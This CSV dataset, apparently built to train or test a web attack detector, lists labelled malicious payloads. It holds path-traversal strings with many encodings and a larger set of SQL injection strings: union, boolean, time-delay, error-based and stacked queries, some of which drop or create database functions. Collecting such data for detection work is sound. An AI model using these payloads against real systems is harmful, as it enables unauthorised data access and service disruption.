"payload","length","attack_type","label"
"/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../{file}","270","path-traversal","anom"
"/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../{file}","279","path-traversal","anom"
"/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../../{file}","285","path-traversal","anom"
"/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa......{file}","272","path-traversal","anom"
"/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa............{file}","278","path-traversal","anom"
"/.../{file}","11","path-traversal","anom"
"/.../.../.../.../{file}","23","path-traversal","anom"
"/.../.../.../.../.../.../.../{file}","35","path-traversal","anom"
"/.........{file}","16","path-traversal","anom"
"/.....................{file}","28","path-traversal","anom"
"/..../..../{file}","17","path-traversal","anom"
"/..../..../..../..../..../{file}","32","path-traversal","anom"
"/..../..../..../..../..../..../..../..../{file}","47","path-traversal","anom"
"/................................{file}","39","path-traversal","anom"
"/........................................................................../../../{file}","88","path-traversal","anom"
"/........................................................................../../../../../../{file}","97","path-traversal","anom"
"/........................................................................../../../../../../../../{file}","103","path-traversal","anom"
"/................................................................................{file}","87","path-traversal","anom"
"/......................................................................................{file}","93","path-traversal","anom"
"/ii{file}","9","path-traversal","anom"
"/iiiii{file}","12","path-traversal","anom"
"/..0x2f{file}","13","path-traversal","anom"
"/..0x2f..0x2f..0x2f..0x2f{file}","31","path-traversal","anom"
"/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{file}","49","path-traversal","anom"
"/0x2e0x2e/0x2e0x2e/{file}","25","path-traversal","anom"
"/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{file}","52","path-traversal","anom"
"/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{file}","79","path-traversal","anom"
"/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{file}","43","path-traversal","anom"
"/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{file}","79","path-traversal","anom"
"/..0x5c{file}","13","path-traversal","anom"
"/..0x5c..0x5c..0x5c..0x5c{file}","31","path-traversal","anom"
"/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{file}","49","path-traversal","anom"
"/0x2e0x2ex2e0x2e{file}","22","path-traversal","anom"
"/0x2e0x2ex2e0x2ex2e0x2ex2e0x2ex2e0x2e{file}","43","path-traversal","anom"
"/0x2e0x2ex2e0x2ex2e0x2ex2e0x2ex2e0x2ex2e0x2ex2e0x2ex2e0x2e{file}","64","path-traversal","anom"
"/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{file}","43","path-traversal","anom"
"/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{file}","79","path-traversal","anom"
"////../{file}","13","path-traversal","anom"
"////../../../../{file}","22","path-traversal","anom"
"////../../../../../../../{file}","31","path-traversal","anom"
"/..//..//{file}","15","path-traversal","anom"
"/..//..//..//..//..//{file}","27","path-traversal","anom"
"/..//..//..//..//..//..//..//..//{file}","39","path-traversal","anom"
"/..///..///..///{file}","22","path-traversal","anom"
"/..///..///..///..///..///..///{file}","37","path-traversal","anom"
"/.//./{file}","12","path-traversal","anom"
"/.//././/././/././/./{file}","27","path-traversal","anom"
"/.//././/././/././/././/././/././/./{file}","42","path-traversal","anom"
"/./../.{file}","13","path-traversal","anom"
"/./../../../../.{file}","22","path-traversal","anom"
"/./../../../../../../../.{file}","31","path-traversal","anom"
"/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../{file}","316","path-traversal","anom"
"/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../{file}","322","path-traversal","anom"
"/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../{file}","331","path-traversal","anom"
"/............................................................................................................................................................{file}","163","path-traversal","anom"
"/..................................................................................................................................................................{file}","169","path-traversal","anom"
"/./../{file}","12","path-traversal","anom"
"/./.././.././.././../{file}","27","path-traversal","anom"
"/./.././.././.././.././.././.././../{file}","42","path-traversal","anom"
"/.//..//.//..//{file}","21","path-traversal","anom"
"/.//..//.//..//.//..//.//..//.//..//{file}","42","path-traversal","anom"
"/.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//{file}","63","path-traversal","anom"
"/../..//../..//{file}","21","path-traversal","anom"
"/../..//../..//../..//../{file}","31","path-traversal","anom"
"/../..//..///{file}","19","path-traversal","anom"
"/../..//../..//../..///{file}","29","path-traversal","anom"
"(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))","219","sqli","anom"
"1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#","87","sqli","anom"
"1 where 2382=2382;(select * from (select(sleep(5)))acdk)#","57","sqli","anom"
"1'||(select 'puco' where 2605=2605 union all select null#","57","sqli","anom"
"-2333' union all select 9714,9714,9714--","40","sqli","anom"
"1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--","85","sqli","anom"
"1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='","77","sqli","anom"
"1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'='","109","sqli","anom"
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'","163","sqli","anom"
"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""","120","sqli","anom"
"-3938%'))) or 2034=7209#","24","sqli","anom"
"1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk","67","sqli","anom"
"-7868"" union all select 1805--","30","sqli","anom"
"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--","118","sqli","anom"
"1""))) and 7533=7533 and (((""alvd"" like ""alvd","44","sqli","anom"
"1') as ildf where 5545=5545 union all select null,null,null,null#","65","sqli","anom"
"1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","109","sqli","anom"
"-4954%"") or 5244=4832","21","sqli","anom"
"-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--","62","sqli","anom"
"1%"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","111","sqli","anom"
"-9100) or 8792=9550--","21","sqli","anom"
"1' in boolean mode);select count(*) from generate_series(1,5000000)#","68","sqli","anom"
"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--","62","sqli","anom"
"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""","124","sqli","anom"
"1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm","223","sqli","anom"
"1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--","95","sqli","anom"
"-1354)) or 8571=8571--","22","sqli","anom"
"1' in boolean mode) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#","114","sqli","anom"
"1%'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('%'='","214","sqli","anom"
"-7324) or make_set(8486=6544,6544)","34","sqli","anom"
"1 and 6969=(select 6969 from pg_sleep(5))-- yczq","48","sqli","anom"
"1"" where 6023=6023;if(1928=4811) select 1928 else drop function ucko--","70","sqli","anom"
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('qtfl'='qtfl","217","sqli","anom"
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--","90","sqli","anom"
"1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--","70","sqli","anom"
"1) where 9724=9724 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--","124","sqli","anom"
"1%') union all select null,null,null,null,null,null--","53","sqli","anom"
"-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--","264","sqli","anom"
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln","176","sqli","anom"
"-4339) where 7178=7178 or 4008=7232","35","sqli","anom"
"1' where 3125=3125 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--","207","sqli","anom"
"1%"");select pg_sleep(5)--","25","sqli","anom"
"-1083%""))) or elt(1032=1032,3623) and (((""%""=""","46","sqli","anom"
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""yxes"" like ""yxes","85","sqli","anom"
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""=""","205","sqli","anom"
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)","102","sqli","anom"
"1)) or 8514=benchmark(5000000,md5(0x544d5a4c))#","47","sqli","anom"
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'fjfo'='fjfo","158","sqli","anom"
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","97","sqli","anom"
"1"")) and 7656=5604 and ((""zuhv""=""zuhv","37","sqli","anom"
"1%') or sleep(5)#","17","sqli","anom"
"-9111"" or 3038=3038","19","sqli","anom"
"1)));select case when 7717=7717 then 1 else null end--","54","sqli","anom"
"1%')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","97","sqli","anom"
"1') and 7290=8416 and ('ktlz' like 'ktlz","40","sqli","anom"
"-7940%"") union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#","76","sqli","anom"
"1"")) as ubrg where 7318=7318 and 7331=6529--","44","sqli","anom"
"1) as hvsk where 7902=7902;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","123","sqli","anom"
"1%""))) union all select null,null,null,null,null,null,null,null,null--","70","sqli","anom"
"1%"";begin user_lock.sleep(5); end and ""%""=""","43","sqli","anom"
"1' union all select null,null,null#","35","sqli","anom"
"1"");(select * from (select(sleep(5)))acdk)#","43","sqli","anom"
"1"") and (3020=3020)*6703 and (""qowc"" like ""qowc","47","sqli","anom"
"-2248'+(select wuow where 4421=4421 union all select 4421,4421,4421,4421,4421,4421--","84","sqli","anom"
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#","69","sqli","anom"
"1'+(select hspl where 4530=4530 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","130","sqli","anom"
"1')));select pg_sleep(5)--","26","sqli","anom"
"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","144","sqli","anom"
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--","90","sqli","anom"
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","97","sqli","anom"
"1')) and elt(6847=5874,5874) and (('yspu'='yspu","47","sqli","anom"
"-9996' or make_set(1237=7111,7111)","34","sqli","anom"
"-5728) where 8663=8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#","90","sqli","anom"
"1))) union all select null,null,null,null,null,null,null,null,null#","67","sqli","anom"
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#","63","sqli","anom"
"1) as pqle where 4039=4039 and 7533=7533--","42","sqli","anom"
"1)) as wajy where 8593=8593;call regexp_substring(repeat(right(char(2385),0),500000000),null)--","95","sqli","anom"
"1)) and elt(9288=6067,6067) and ((1895=1895","43","sqli","anom"
"-7184) as fshx where 3408=3408 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","227","sqli","anom"
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""rugr""=""rugr","85","sqli","anom"
"1')));begin user_lock.sleep(5); end and ((('gqhc'='gqhc","55","sqli","anom"
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)","100","sqli","anom"
"1' where 7191=7191 rlike sleep(5)--","35","sqli","anom"
"-1859' union all select 1781,1781,1781,1781#","44","sqli","anom"
"1')));select case when 2948=7279 then 1 else null end--","55","sqli","anom"
"1"") and 7533=7533 and (""jfsw"" like ""jfsw","40","sqli","anom"
"-4413%')) union all select 1345,1345#","37","sqli","anom"
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('tpcm' like 'tpcm","178","sqli","anom"
"-7103)) or 4610=1871 and ((1249=1249","36","sqli","anom"
"-4410 where 5749=5749 or 1317=9823--","36","sqli","anom"
"1')));select case when 3819=1887 then 1 else null end--","55","sqli","anom"
"1')) and sleep(5) and (('jiio' like 'jiio","41","sqli","anom"
"1%') and make_set(8403=8403,8899) and ('%'='","44","sqli","anom"
"1' in boolean mode) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","126","sqli","anom"
"-5082)) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#","75","sqli","anom"
"1') as hvyx where 3194=3194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","168","sqli","anom"
"-9175')) union all select 6174,6174,6174,6174--","47","sqli","anom"
"1'||(select 'bupa' from dual where 8548=8548;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--","138","sqli","anom"
"1'||(select 'bezt' where 7876=7876;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#","118","sqli","anom"
"-6081 where 3681=3681 or 2603=3138--","36","sqli","anom"
"1"" where 3990=3990 and 8594=(select 8594 from pg_sleep(5))--","60","sqli","anom"
"-3071)) as uiiu where 8910=8910 union all select 8910,8910,8910,8910,8910,8910,8910#","84","sqli","anom"
"1') or (select * from (select(sleep(5)))ydpu) and ('zaes'='zaes","63","sqli","anom"
"1) and elt(7425=8842,8842) and (9194=9194","41","sqli","anom"
"1%"") rlike (select * from (select(sleep(5)))sgvo) and (""%""=""","60","sqli","anom"
"1%') union all select null,null,null#","37","sqli","anom"
"1)) as pmff where 6649=6649;begin user_lock.sleep(5); end--","59","sqli","anom"
"-7347"")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#","71","sqli","anom"
"1' in boolean mode);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual#","102","sqli","anom"
"1' in boolean mode) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","157","sqli","anom"
"-1583') or elt(1032=1032,3623) and ('jrcj' like 'jrcj","53","sqli","anom"
"1"") rlike (select * from (select(sleep(5)))sgvo) and (""fkmh""=""fkmh","66","sqli","anom"
"1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ymnm'='ymnm","218","sqli","anom"
"-1432 order by 1#","17","sqli","anom"
"1) where 2734=2734 waitfor delay '0:0:5'--","42","sqli","anom"
"-2793') where 2621=2621 union all select 2621#","46","sqli","anom"
"-5585%'))) or 6990=7727","23","sqli","anom"
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (5621=5621","121","sqli","anom"
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3","85","sqli","anom"
"1"" where 1809=1809 and make_set(8403=8403,8899)--","49","sqli","anom"
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","109","sqli","anom"
"1"") where 9962=9962 and 4595=4595#","34","sqli","anom"
"1)) as pynj where 7683=7683 waitfor delay '0:0:5'--","51","sqli","anom"
"1"") where 6823=6823 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","161","sqli","anom"
"1')) or (select * from (select(sleep(5)))ydpu) and (('yqbo'='yqbo","65","sqli","anom"
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# lgoz","162","sqli","anom"
"1') as siyk where 1514=1514 union all select null,null,null,null,null,null#","75","sqli","anom"
"1'||(select 'owzs' where 1475=1475 union all select null--","58","sqli","anom"
"1"") where 3321=3321;begin dbms_lock.sleep(5); end--","51","sqli","anom"
"1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)","189","sqli","anom"
"1') as rqzz where 4987=4987 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--","133","sqli","anom"
"1' where 8430=8430 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","120","sqli","anom"
"1 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","109","sqli","anom"
"1'||(select 'scqw' where 3337=3337 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","110","sqli","anom"
"1) where 4710=4710 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--","150","sqli","anom"
"-7111 union all select 2409,2409,2409,2409,2409,2409#","53","sqli","anom"
"1') where 2330=2330 and (select * from (select(sleep(5)))fzno)--","64","sqli","anom"
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'gajm'='gajm","134","sqli","anom"
"1%"")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)#","90","sqli","anom"
"1"")) as xwrq where 4161=4161;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","120","sqli","anom"
"1%') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('%'='","75","sqli","anom"
"1) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (8450=8450","173","sqli","anom"
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""ctrr""=""ctrr","79","sqli","anom"
"1' in boolean mode);select benchmark(5000000,md5(0x4c4d6142))#","62","sqli","anom"
"1'+(select qjng where 1897=1897 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'","140","sqli","anom"
"1"";iif(5257=5257,1,1/0)","23","sqli","anom"
"1))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((7589=7589","176","sqli","anom"
"1'+(select dagm where 5461=5461 or 8466=benchmark(5000000,md5(0x694a4745)))+'","77","sqli","anom"
"1"") as wjdc where 8694=8694 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--","216","sqli","anom"
"-5700 where 4238=4238 union all select 4238,4238,4238#","54","sqli","anom"
"1"") where 3445=3445 and elt(1212=1254,1254)--","45","sqli","anom"
"1'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--","69","sqli","anom"
"1'+(select dnxi where 5850=5850 or 8156=(select count(*) from generate_series(1,5000000))--","91","sqli","anom"
"-8025"") or (1436=4186)*4186 and (""sqwv"" like ""sqwv","50","sqli","anom"
"1"";begin dbms_lock.sleep(5); end and ""xouo"" like ""xouo","54","sqli","anom"
"-1174"" union all select 4303,4303,4303,4303#","44","sqli","anom"
"1%"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","121","sqli","anom"
"1%"";begin dbms_lock.sleep(5); end and ""%""=""","43","sqli","anom"
"1"") as cysq where 5258=5258;select case when 1574=5523 then 1 else null end--","77","sqli","anom"
"-8325)) as ajxq where 6630=6630 union all select 6630,6630,6630,6630,6630,6630--","80","sqli","anom"
"1)) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","79","sqli","anom"
"1%"");iif(5257=5257,1,1/0)","25","sqli","anom"
"1%"") or (select * from (select(sleep(5)))sddo)#","47","sqli","anom"
"1 and 9198=9198--","17","sqli","anom"
"1%'));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--","103","sqli","anom"
"-3853"") where 4626=4626 union all select 4626,4626,4626--","57","sqli","anom"
"1'+(select inyd where 1668=1668 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))+'","123","sqli","anom"
"1') where 5883=5883 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","171","sqli","anom"
"1"")) as irrz where 8730=8730 order by 1#","40","sqli","anom"
"1%')) union all select null,null,null,null,null--","49","sqli","anom"
"1'||(select 'vwmg' where 7928=7928;select (case when (8233=1074) then 8233 else 1/(select 0) end)--","99","sqli","anom"
"-1755%' union all select 2615,2615,2615,2615,2615,2615#","55","sqli","anom"
"-8894%"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""%""=""","219","sqli","anom"
"1"") as qwyt where 4236=4236 union all select null,null,null,null,null--","71","sqli","anom"
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('edcm' like 'edcm","176","sqli","anom"
"1%"")) and elt(7633=4110,4110) and ((""%""=""","41","sqli","anom"
"1"")) as esho where 8864=8864 order by 1--","41","sqli","anom"
"-9808' in boolean mode) union all select 2528,2528,2528,2528,2528,2528,2528--","77","sqli","anom"
"1"")));if(7899=7899) select 7899 else drop function zbbp--","57","sqli","anom"
"-7737'||(select 'xalo' where 9219=9219 union all select 9219,9219,9219,9219#","76","sqli","anom"
"1 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","109","sqli","anom"
"-3316%"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""","203","sqli","anom"
"1"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""jyad""=""jyad","116","sqli","anom"
"1'||(select 'kgjk' where 3530=3530 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","130","sqli","anom"
"1' or (select * from (select(sleep(5)))ydpu)","44","sqli","anom"
"1') where 1625=1625 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","122","sqli","anom"
"1%' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","111","sqli","anom"
"1"")) waitfor delay '0:0:5'--","28","sqli","anom"
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--","76","sqli","anom"
